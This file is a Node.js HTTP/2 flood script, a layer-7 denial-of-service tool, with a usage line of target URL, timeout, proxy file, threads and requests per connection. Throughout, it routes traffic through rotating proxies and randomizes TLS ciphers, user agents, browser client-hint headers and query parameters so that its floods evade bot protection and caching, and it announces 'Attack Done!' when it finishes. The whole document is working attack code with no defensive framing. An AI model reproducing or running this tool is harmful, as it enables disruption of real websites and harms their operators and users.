const fs = require("fs"),
    tls = require("tls"),
    url = require("url"),
    http = require("http"),
    http2 = require("http2"),
    // crypto = require("crypto"),
    cluster = require("cluster");

const cipherList = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    // "ECDHE-ECDSA-AES128-GCM-SHA256",
    // "ECDHE-ECDSA-CHACHA20-POLY1305",
    // "ECDHE-RSA-AES128-GCM-SHA256",
    // "ECDHE-RSA-CHACHA20-POLY1305",
    // "ECDHE-ECDSA-AES256-GCM-SHA384",
    // "ECDHE-RSA-AES256-GCM-SHA384",
    // "ECDHE-ECDSA-AES128-SHA256",
    // "ECDHE-RSA-AES128-SHA256",
    // "ECDHE-ECDSA-AES256-SHA384",
    // "ECDHE-RSA-AES256-SHA384",
],
    sigals = [
        "ecdsa_secp256r1_sha256",
        "ecdsa_secp384r1_sha384",
        "ecdsa_secp521r1_sha512",
        "rsa_pss_rsae_sha256",
        "rsa_pss_rsae_sha384",
        "rsa_pss_rsae_sha512",
        "rsa_pkcs1_sha256",
        "rsa_pkcs1_sha384",
        "rsa_pkcs1_sha512",
    ],
    accepts = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html, application/xhtml+xml, application/xml;q=0.9, */*;",
        "application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*",
        "text/html, application/xhtml+xml, image/jxr, */*",
        "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "text/html, application/xhtml+xml",
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/plain;q=0.8,image/png,*/*;q=0.5",
        "text/plain, */*; q=0.01",
        "application/json, text/plain, */*",
        "*/*"
    ],
    acceptEnc = [
        "gzip, deflate, br",
    ],
    acceptChar = [
        "utf-8, iso-8859-1;q=0.5",
        "iso-8859-1, utf-8, utf-16, *;q=0.1",
        "iso-8859-1",
    ],
    platform = [
        "Windows",
        "Macintosh",
        "Linux",
        "Android",
        "iPhone",
        "iPad",
        "iPod",
    ],
    acceptlangs = [
        "en-US,en;q=0.8",
        "en-US,en;q=0.5",
        "en-US,en;q=0.9",
        "en-US,en;q=0.7",
        "en-US,en;q=0.6",

        //Chinese
        "zh-CN,zh;q=0.8",
        "zh-CN,zh;q=0.5",
        "zh-CN,zh;q=0.9",
        "zh-CN,zh;q=0.7",
        "zh-CN,zh;q=0.6",

        //Spanish
        "es-ES,es;q=0.8",
        "es-ES,es;q=0.5",
        "es-ES,es;q=0.9",
        "es-ES,es;q=0.7",
        "es-ES,es;q=0.6",

        //French
        "fr-FR,fr;q=0.8",
        "fr-FR,fr;q=0.5",
        "fr-FR,fr;q=0.9",
        "fr-FR,fr;q=0.7",
        "fr-FR,fr;q=0.6",

        //German
        "de-DE,de;q=0.8",
        "de-DE,de;q=0.5",
        "de-DE,de;q=0.9",
        "de-DE,de;q=0.7",
        "de-DE,de;q=0.6",

        //Italian
        "it-IT,it;q=0.8",
        "it-IT,it;q=0.5",
        "it-IT,it;q=0.9",
        "it-IT,it;q=0.7",
        "it-IT,it;q=0.6",

        //Japanese
        "ja-JP,ja;q=0.8",
        "ja-JP,ja;q=0.5",
        "ja-JP,ja;q=0.9",
        "ja-JP,ja;q=0.7",
        "ja-JP,ja;q=0.6",

        //En + Russian
        "en-US,en;q=0.8,ru;q=0.6",
        "en-US,en;q=0.5,ru;q=0.3",
        "en-US,en;q=0.9,ru;q=0.7",
        "en-US,en;q=0.7,ru;q=0.5",
        "en-US,en;q=0.6,ru;q=0.4",

        //En + Chinese
        "en-US,en;q=0.8,zh-CN;q=0.6",

        //En + Spanish
        "en-US,en;q=0.8,es-ES;q=0.6",

        //En + French
        "en-US,en;q=0.8,fr-FR;q=0.6",

        //En + German
        "en-US,en;q=0.8,de-DE;q=0.6",
    ],
    queryLists = ['s', 'q', 'query', 'search', 'fbclid', 'id', 'name', 'item', 'user', 'userid', 'email', 'price', 'amount', 'quarntity', '_', 'history', 'page', 'where', 'line', 'limit', 'price', 'stock', 'lengths', 'ips', 'm', 'redirects', 'redirect_url', 'destination']

if (process.argv.length < 7 || process.argv.length > 8) {
    console.log(
        "Usage: node index.js <url> <timeout> <proxies> <threads> <rpp>"
    );
    process.exit(1);
}

const options = {
    target: process.argv[2],
    timeout: process.argv[3],
    proxy: "",
    threads: process.argv[5],
    rpp: process.argv[6],
};

function randomIp() {
    const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(
        Math.random() * 255
    )}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

    return isPrivate(ip) ? randomIp() : ip;
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function isPrivate(ip) {
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

function randStr() {
    const chars =
        "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
    let string_length = 10;
    let randomstring = "";
    for (let i = 0; i < string_length; i++) {
        let rnum = Math.floor(Math.random() * chars.length);
        randomstring += chars.substring(rnum, rnum + 1);
    }
    return randomstring;
}

// const ipMapping = new Map();

(async () => {
    process
        .on("uncaughtException", function (err) {
            //console.log(err)
        })
        .on("unhandledRejection", function (err) {
            //console.log(err)
        })
        .setMaxListeners(Infinity);

    //remove duplicates
    const proxies = await fs.readFileSync(process.argv[4], "utf8").toString().trimEnd().replace(/\r/g, "").split("\n").filter((v, i, a) => a.indexOf(v) === i);
    const threads = options.threads;
    const rpp = options.rpp;
    const timeout = options.timeout;
    const target = options.target;

    if (cluster.isMaster) {
        console.log("Starting cluster with " + threads + " threads");
        for (let i = 0; i < threads; i++) {
            cluster.fork();
        }
        setTimeout(() => {
            console.log("Attack Done!");
            process.exit(0);
        }, Math.floor(timeout * 1000));
    } else {
        console.log("Starting thread " + cluster.worker.id);
        setInterval(() => {
            const proxy = (proxies[Math.floor(Math.random() * proxies.length)]).split(":");
            const parsed = url.parse(target);

            const agent = new http.Agent({
                keepAlive: true,
                keepAliveMsecs: 10000,
                maxSockets: Infinity,
                maxFreeSockets: Infinity,
                timeout: 60000,
                freeSocketTimeout: 30000,
            });

            var h1connection = http.request(
                {
                    host: proxy[0],
                    port: proxy[1],
                    agent: agent,
                    globalAgent: agent,
                    ciphers:
                        cipherList[
                            Math.floor(Math.random() * cipherList.length)
                        ],
                    method: "CONNECT",
                    headers: {
                        'Connection': 'keep-alive',
                        'Host': parsed.host,
                        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    },
                    timeout: 30000,
                    path: parsed.host + ":443",
                },
                function () {
                    h1connection.setSocketKeepAlive(true);
                }
            );

            h1connection.on("connect", (_, socket) => {
                const randCipher = cipherList[
                                    Math.floor(
                                        Math.random() * cipherList.length
                                    )
                                ];
                const randSigals = sigals[Math.floor(Math.random() * sigals.length)];
                const http2session = http2.connect(parsed.href, {
                    createConnection: () => {
                        return tls.connect({
                            host: parsed.host,
                            ciphers:randCipher,
                            sigalgs: randSigals,
                            agent: agent,
                            servername: parsed.host,
                            rejectUnauthorized: false,
                            secureContext: tls.createSecureContext({
                                secureProtocol: "TLS_method",
                                sessionTimeout: 30000,
                            }),
                            // secureOptions:
                            //     crypto.constants.SSL_OP_NO_RENEGOTIATION |
                            //     crypto.constants.SSL_OP_NO_TICKET |
                            //     crypto.constants.SSL_OP_NO_SSLv2 |
                            //     crypto.constants.SSL_OP_NO_SSLv3 |
                            //     crypto.constants.SSL_OP_NO_COMPRESSION |
                            //     crypto.constants.SSL_OP_NO_RENEGOTIATION |
                            //     crypto.constants
                            //         .SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                            //     crypto.constants.SSL_OP_TLSEXT_PADDING |
                            //     crypto.constants.SSL_OP_ALL |
                            //     crypto.constants.SSLcom,
                            port: 443,
                            honorCipherOrder: false,
                            minVersion: "TLSv1.2",
                            echdCurve: "P-256:P-384:P-521:X25519",
                            secure: true,
                            rejectUnauthorized: false,
                            requestCert: true,
                            ALPNProtocols: ["h2"],
                            timeout: 30000,
                            sessionTimeout: 30000,
                            socket: socket
                        });
                    },
                    "protocol": "https:",
                    settings: {
                        headerTableSize: 65536,
                        maxConcurrentStreams: 1000,
                        initialWindowSize: 6291456,
                        maxHeaderListSize: 262144,
                        enablePush: false
                    }
                });

                http2session.on("connect", (_, tlsSocket) => {
                    var valueofgod = 1;
                    var signature_0x1 = getRandomInt(82, 110);
                    var cookie;
                    var signature_0x2 = getRandomInt(80, 99);
                    var signature_0x3 = Math.floor(Math.random() * 5) == 0 ? getRandomInt(1000, 8000) : 0;
                    var signature_0x4 = Math.floor(Math.random() * 2) == 0 ? getRandomInt(67, 459) : 0;
                    //var signature_0x3 = getRandomInt(70, 99);
                    // const plat = platform[Math.floor(Math.random() * platform.length)];
                    // const mobiledd = getRandomInt(0, 1);
                    // const randed829ijv = randomIp();
                    var randUserAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.0.0 Safari/537.36 OPR/${signature_0x2}.0.${signature_0x3}.${signature_0x4}`
                    //console.log(randUserAgent)
                    
                    const acceptLangRanded = acceptlangs[Math.floor(Math.random() * acceptlangs.length)];

                    tlsSocket.setKeepAlive(true, 30000);
                    tlsSocket.setTimeout(30000);
                    tlsSocket.setEncoding("utf8");
                    const buildSession = Object.assign({
                        ':authority': parsed.host,
                        ':method': 'GET',
                        ':path': parsed.pathname,
                        ':scheme': parsed.protocol.substring(0, parsed.protocol.length - 1)
                        },
                        {
                            'user-agent': randUserAgent,
                            'accept': accepts[Math.floor(Math.random() * accepts.length)],
                            'accept-language': acceptLangRanded,
                            'accept-encoding': acceptEnc[Math.floor(Math.random() * acceptEnc.length)],
                            // 'x-requested-with': 'XMLHttpRequest',
                            'cache-control': 'no-cache',
                            'pragma':'no-cache',
                            // 'origin': `${parsed.protocol}//${parsed.host}`,
                            // 'referer': `${parsed.protocol}//${parsed.host}/`,
                            // 'content-length': '0',
                            'sec-ch-ua': `"Chromium";v="${signature_0x1}", "Opera GX";v="${signature_0x2}", "Not)A;Brand";v="99"`,
                            "sec-fetch-dest": "document",
                            "sec-ch-ua-mobile": `?0`,
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-site": "none",
                            "sec-fetch-user": "?1",
                            //"sec-fetch-user":"?1",
                            "priority":"u=0",
                            // "x-forwarded-for": randed829ijv,
                            // "x-real-ip": randed829ijv,
                            'sec-ch-ua-platform': "\"Windows\"",
                            'upgrade-insecure-requests': '1'
                        });
                    const http2requestfirst = http2session.request(buildSession)
                    http2requestfirst.on('error', () => {
                        delete h1connection;
                        delete proxy;
                        delete parsed;
                        delete agent;
                        delete randCipher;
                        delete randSigals;
                        delete response;
                        delete valueofgod;
                        delete cookie;
                        delete randUserAgent;
                        delete signature_0x4;
                        delete signature_0x3;
                        delete signature_0x2;
                        delete signature_0x1;
                        delete tlsSocket;
                        delete buildSession;
                        delete http2session;
                        delete http2requestfirst;
                        return;
                    }).end()
                    .on('response', response => {
                        if (!cookie) cookie = response['set-cookie'] !== undefined ? String(response['set-cookie'].map(x => x.split(';')[0]).join('; ')).slice(0,-1) : undefined;
                        if (response[":status"] == 403) {
                          delete h1connection;
                          delete proxy;
                          delete parsed;
                          delete agent;
                          delete http2session;
                          delete randCipher;
                          delete randSigals;
                          delete response;
                          delete valueofgod;
                          delete cookie;
                          delete randUserAgent;
                          delete signature_0x4;
                          delete signature_0x3;
                          delete signature_0x2;
                          delete signature_0x1;
                          delete tlsSocket;
                          delete buildSession;
                          delete http2requestfirst;
                          return;
                        }
                        //console.log(response[":status"])
                        //console.log("Sended",response[":status"])
                        // if (Number(response[":status"]) >= 400 && Number(response[":status"]) <= 599) ipMapping.set(proxy[0], Math.floor(Number(ipMapping.get(proxy[0])) + 1));
                        // if (ipMapping.get(proxy[0]) === 24) {
                        //     const bantime = getRandomInt(1,5);
                        //     console.log(proxy[0],`is banned ${bantime} waiting seconds`)
                        //     const time = setTimeout(() => {
                        //         ipMapping.set(proxy[0], 0);
                        //         clearTimeout(time);
                        //     }, Math.floor(bantime * 1000));
                        // }
                        http2requestfirst.close();
                        delete response;
                        delete buildSession;
                        delete http2requestfirst;

                        for (let i = 0; i < rpp; i++) {
                            //tlsSocket.setNoDelay(true);
                            valueofgod++;
                            tlsSocket.setKeepAlive(true, 30000);
                            tlsSocket.setTimeout(30000);
                            tlsSocket.setEncoding("utf8");
                            const sendReqqmp = Object.assign({
                                ':authority': parsed.host,
                                ':method': ['GET', 'OPTIONS'][Math.floor(Math.random() * 1)],
                                ':path': `${parsed.pathname}${parsed.query 
                                                ? `?${parsed.query}&${queryLists[Math.floor(Math.random() * queryLists.length)]}=${(getRandomInt(1,2) === 2 ? randStr(getRandomInt(5, 12)) : getRandomInt(50000, 1200000))}` 
                                                : `?${queryLists[Math.floor(Math.random() * queryLists.length)]}=${(getRandomInt(1,2) === 2 ? randStr(getRandomInt(5, 12)) : getRandomInt(50000, 1200000))}`}`,
                                ':scheme': parsed.protocol.substring(0, parsed.protocol.length - 1)
                                },
                                {
                                    'user-agent': randUserAgent,
                                    'accept': accepts[Math.floor(Math.random() * accepts.length)],
                                    'accept-language': acceptLangRanded,
                                    'accept-encoding': acceptEnc[Math.floor(Math.random() * acceptEnc.length)],
                                    'x-requested-with': 'XMLHttpRequest',
                                    'cache-control': 'no-cache',
                                    'origin': `${parsed.protocol}//${parsed.host}`,
                                    'referer': `${parsed.protocol}//${parsed.host}/`,
                                    //"priority":"u=0",
                                    // 'content-length': '0',
                                    'sec-ch-ua': `"Chromium";v="${signature_0x1}", "Opera GX";v="${signature_0x2}", "Not)A;Brand";v="99"`,
                                    "sec-fetch-dest": "empty",
                                    "sec-ch-ua-mobile": "?0",
                                    "sec-fetch-mode": "cors",
                                    "sec-fetch-site": "same-site",
                                    // "x-forwarded-for": randed829ijv,
                                    // "x-real-ip": randed829ijv,
                                    'sec-ch-ua-platform': "\"Windows\"",
                                    'upgrade-insecure-requests': '1',
                                    ...(cookie ? {cookie} : {})
                                });
                            const http2request = http2session.request(sendReqqmp);
    
                            // http2request.end();
                            http2request.on('error', () => {
                                http2request.close();
                                delete sendReqqmp;
                                delete randUserAgent;
                                delete http2request;
                                delete h1connection;
                                delete proxy;
                                delete parsed;
                                delete http2session;
                                delete agent;
                                delete randCipher;
                                delete randSigals;
                                delete response;
                                delete valueofgod;
                                delete cookie;
                                delete randUserAgent;
                                delete signature_0x4;
                                delete signature_0x3;
                                delete signature_0x2;
                                delete signature_0x1;
                                delete tlsSocket;
                                delete randCipher;
                                delete randSigals;
                                return;
                            }).end()
                            .on('response', response => {
                                delete response;
                                delete sendReqqmp;
                                http2request.close();
                                if (valueofgod >= Math.floor(rpp - 5)) {
                                    delete randUserAgent;
                                    delete response;
                                    delete http2request;
                                    delete h1connection;
                                    delete http2session;
                                    delete proxy;
                                    delete parsed;
                                    delete agent;
                                    delete randCipher;
                                    delete randSigals;
                                    delete response;
                                    delete valueofgod;
                                    delete cookie;
                                    delete randUserAgent;
                                    delete signature_0x4;
                                    delete signature_0x3;
                                    delete signature_0x2;
                                    delete signature_0x1;
                                    delete tlsSocket;
                                    delete randCipher;
                                    delete randSigals;
                                    return;
                                }
                            });
                        }
                        return;
                    });
                });
            });

            h1connection.end();
        });
    }
})();
